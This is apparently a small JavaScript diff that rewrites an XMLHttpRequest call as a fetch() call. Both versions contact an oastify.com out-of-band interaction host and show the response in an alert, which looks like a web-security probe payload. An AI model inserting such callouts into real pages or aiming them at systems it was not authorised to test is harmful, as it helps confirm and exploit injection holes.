@@ -1,9 +1,8 @@
-    var xhr = new XMLHttpRequest();
-    xhr.open("GET", "//as6puyobkfflc2idxp8m5352nttkhbdz2.oastify.com", true);
-    xhr.onreadystatechange = function() {
-        if (xhr.readyState === 4 && xhr.status === 200) {
-            var sourceCode = xhr.responseText;
-            alert("Source Code:\n" + sourceCode);
-        }
-    };
-    xhr.send();
+    fetch("//as6puyobkfflc2idxp8m5352nttkhbdz2.oastify.com/?")
+        .then(response => response.text())
+        .then(data => {
+            alert("Source Code:\n" + data);
+        })
+        .catch(error => {
+            console.error("Error:", error);
+        });
